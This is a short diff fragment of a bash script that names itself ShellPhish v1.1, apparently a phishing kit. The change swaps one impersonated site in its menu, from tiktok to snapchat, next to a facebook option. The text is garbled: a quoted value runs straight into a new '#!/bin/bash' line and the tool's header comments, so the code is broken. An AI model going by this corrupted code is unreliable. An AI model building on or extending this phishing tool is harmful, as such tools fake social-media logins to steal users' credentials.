@@ -36,7 +36,7 @@ elif [[ $option == 2 ]]; then
 server="facebook"
 start
 elif [[ $option == 3 ]]; then
-server="tiktok#!/bin/bash
+server="snapchat#!/bin/bash
 # ShellPhish v1.1
 # Coded by: thelinuxchoice
 # Github: https://github.com/thelinuxchoice/shellphish
